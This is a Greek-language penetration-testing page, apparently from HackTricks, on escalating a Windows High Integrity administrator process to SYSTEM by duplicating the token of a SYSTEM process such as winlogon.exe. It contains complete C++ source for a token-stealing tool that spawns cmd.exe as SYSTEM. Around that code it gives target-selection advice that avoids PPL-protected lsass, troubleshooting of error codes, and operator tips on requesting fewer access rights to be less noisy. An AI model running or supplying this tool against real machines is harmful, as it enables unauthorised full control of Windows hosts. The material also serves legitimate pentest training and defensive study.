# SeImpersonate από High σε System

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα αφορά τη **manual** διαδικασία μετάβασης από μια **High Integrity administrator process** σε **`NT AUTHORITY\SYSTEM`**, με **άνοιγμα μιας μη προστατευμένης SYSTEM process, αντιγραφή του token της και εκκίνηση μιας child process με αυτό το token**.

Αν διαθέτετε μόνο **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** αλλά **δεν μπορείτε να ανοίξετε μια κατάλληλη SYSTEM process**, η διαδρομή **Potato / named-pipe** είναι συνήθως πιο αξιόπιστη:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Αν αυτό που θέλετε δεν είναι μόνο το `SYSTEM`, αλλά ένα **SYSTEM token με όσο το δυνατόν περισσότερα privileges**, ελέγξτε επίσης:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Γρήγορο triage

Πριν προσπαθήσετε να κλέψετε ένα token, επαληθεύστε γρήγορα το context:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Πρακτικές σημειώσεις:

- Ένα token διαχειριστή **High Integrity** συνήθως αρκεί για την **ενεργοποίηση του `SeDebugPrivilege`** και το άνοιγμα πολλών μη προστατευμένων διεργασιών SYSTEM.
- Η **`CreateProcessWithTokenW` απαιτεί `SeImpersonatePrivilege`** από τον caller. Αν αυτό το API αποτύχει με `1314`, χρησιμοποιήστε την **`CreateProcessAsUserW`** αφού πρώτα έχετε κάνει duplicate ένα SYSTEM primary token.
- Στα σύγχρονα Windows, το **`lsass.exe` είναι συχνά κακός στόχος**, επειδή η **LSA protection / PPL** αποκλείει την πρόσβαση ακόμη και για administrators με `SeDebugPrivilege`. Προτιμήστε τα **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** ή ένα πρώιμο **`svchost.exe`** που εκτελείται ως SYSTEM.
- Δεν έχει κάθε SYSTEM process εξίσου χρήσιμο token. Αν αποκτήσετε SYSTEM αλλά παρατηρήσετε ότι λείπουν privileges, δοκιμάστε διαφορετικό SYSTEM process αντί να θεωρήσετε ότι η τεχνική δεν λειτουργεί.

## Επιλέξτε προσεκτικά το PID

Ο ευκολότερος τρόπος για να λειτουργήσει αυτό αξιόπιστα είναι να **επιλέξετε ένα SYSTEM process του οποίου το DACL επιτρέπει πράγματι στους Administrators να κάνουν query στο process και να κάνουν duplicate το token του**.

Καλοί υποψήφιοι για αρχική δοκιμή:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- ορισμένα πρώιμα instances του `svchost.exe` που εκτελούνται ως SYSTEM

Αποφύγετε από προεπιλογή:

- το `lsass.exe` σε hosts όπου είναι ενεργοποιημένο το **RunAsPPL / LSA protection**
- protected / security-sensitive processes που επιστρέφουν `Access denied` ακόμη και μετά την ενεργοποίηση του `SeDebugPrivilege`

Μπορείτε να επιθεωρήσετε υποψήφια processes και τα token/ACL τους με το **Process Explorer** ή το **Process Hacker**, εκτελώντας τα elevated.

### Code

Ο ακόλουθος κώδικας προέρχεται από [εδώ](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Επιτρέπει να **ορίσετε ένα Process ID ως όρισμα**, και θα εκτελεστεί ένα CMD **ως ο χρήστης** του υποδεικνυόμενου process.<sup>[[3]](#references)</sup>\
Εκτελώντας τον σε ένα process High Integrity, μπορείτε να **ορίσετε το PID ενός process που εκτελείται ως System** (όπως τα `winlogon`, `wininit`) και να εκτελέσετε ένα `cmd.exe` ως SYSTEM.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Χρήσιμες σημειώσεις για API / access rights

Το sample χρησιμοποιεί `MAXIMUM_ALLOWED`, αλλά για πραγματικές operations είναι χρήσιμο να θυμάστε τα ελάχιστα απαιτούμενα στοιχεία:

- Το `OpenProcessToken()` απαιτεί μόνο το **process handle** να έχει ανοιχτεί με **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Για τη χρήση του `CreateProcessWithTokenW()`, το **primary token handle** πρέπει να έχει **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
- Το `DuplicateTokenEx()` πρέπει να δημιουργεί ένα **primary token** (`TokenPrimary`), όχι μόνο ένα impersonation token.
- Αν έχετε ήδη κάνει impersonate ως SYSTEM και το `CreateProcessWithTokenW()` εξακολουθεί να αποτυγχάνει με `1314`, δοκιμάστε αντ' αυτού το `CreateProcessAsUserW()`.

Αυτό σημαίνει ότι το άνοιγμα του target process με `PROCESS_ALL_ACCESS` είναι συνήθως περιττό και πιο θορυβώδες από την απλή αίτηση των rights που απαιτούνται για το query του token.

## Error

Σε ορισμένες περιπτώσεις μπορεί να προσπαθήσετε να κάνετε impersonate το System και να μην λειτουργήσει, εμφανίζοντας output όπως το ακόλουθο:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Αυτό σημαίνει ότι, ακόμη και αν εκτελείστε σε επίπεδο High Integrity, **δεν έχετε αρκετά δικαιώματα** πάνω στη συγκεκριμένη διεργασία/το συγκεκριμένο token.\
Ας ελέγξουμε τα τρέχοντα δικαιώματα του Administrator πάνω στις διεργασίες `svchost.exe` με το **Process Explorer** (ή μπορείτε επίσης να χρησιμοποιήσετε το **Process Hacker**):

1. Επιλέξτε μια διεργασία `svchost.exe`
2. Κάντε δεξί κλικ --> Properties
3. Στην καρτέλα "Security", κάντε κλικ κάτω δεξιά στο κουμπί "Permissions"
4. Κάντε κλικ στο "Advanced"
5. Επιλέξτε "Administrators" και κάντε κλικ στο "Edit"
6. Κάντε κλικ στο "Show advanced permissions"

![Κώδικας - Σφάλμα: 6. Κάντε κλικ στο "Show advanced permissions"](<../../images/image (437).png>)

Η προηγούμενη εικόνα περιέχει όλα τα δικαιώματα που έχουν οι "Administrators" πάνω στην επιλεγμένη διεργασία (όπως βλέπετε, στην περίπτωση του `svchost.exe` έχουν μόνο δικαιώματα "Query").

Δείτε τα δικαιώματα που έχουν οι "Administrators" πάνω στο `winlogon.exe`:

![Κώδικας - Σφάλμα: Δείτε τα δικαιώματα που έχουν οι "Administrators" πάνω στο winlogon.exe](<../../images/image (1102).png>)

Μέσα σε αυτή τη διεργασία, οι "Administrators" μπορούν να κάνουν "Read Memory" και "Read Permissions", κάτι που πιθανότατα επιτρέπει στους Administrators να κάνουν impersonate το token που χρησιμοποιείται από αυτή τη διεργασία.

### Συνήθεις αιτίες αποτυχίας

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: το DACL της διεργασίας σας αποκλείει ή ο στόχος είναι **protected/PPL**. Επιλέξτε άλλη διεργασία SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: το token handle σας ανοίχτηκε χωρίς επαρκή δικαιώματα ή το DACL του target token δεν επιτρέπει την αντιγραφή.
- **`CreateProcessWithTokenW()` -> `1314`**: ο caller δεν έχει επί του παρόντος ενεργοποιημένο το **`SeImpersonatePrivilege`**. Δοκιμάστε να το ενεργοποιήσετε πρώτα ή χρησιμοποιήστε το `CreateProcessAsUserW()` με το duplicated primary token.
- **`CreateProcessWithTokenW()` -> `1326`** μετά από προηγούμενες αποτυχίες: αυτό συνήθως σημαίνει απλώς ότι το προηγούμενο βήμα αντιγραφής/impersonation του token απέτυχε, επομένως δεν υπάρχει usable primary token για την εκκίνηση της child process.

## Σημειώσεις χειριστή

- Αυτή η τεχνική είναι εξαιρετική όταν έχετε ήδη **local admin + high integrity** και θέλετε απλώς έναν γρήγορο, χειροκίνητο τρόπο για SYSTEM χωρίς να εκκινήσετε service ή να δημιουργήσετε chain coercion με named pipe.
- Σε hardened περιβάλλοντα Windows 11 / Server, η **LSA protection** γίνεται όλο και πιο συνηθισμένη, επομένως μια ροή εργασίας που θεωρεί ότι το `lsass.exe` είναι πάντα readable δεν είναι αξιόπιστη. Τα **`winlogon.exe` / `wininit.exe` / `services.exe` είναι συνήθως καλύτερες πρώτες επιλογές**.<sup>[[2]](#references)</sup>
- Αν αποκτήσετε πρόσβαση σε context **service account** αντί για elevated admin desktop, η οικογένεια **Potato** είναι συνήθως καταλληλότερη από αυτή τη σελίδα.



## Αναφορές

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Κατάχρηση των Windows tokens για παραβίαση του Active Directory χωρίς πρόσβαση στο LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Κατανόηση και κατάχρηση των Process Tokens — Μέρος II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)

{{#include ../../banners/hacktricks-training.md}}
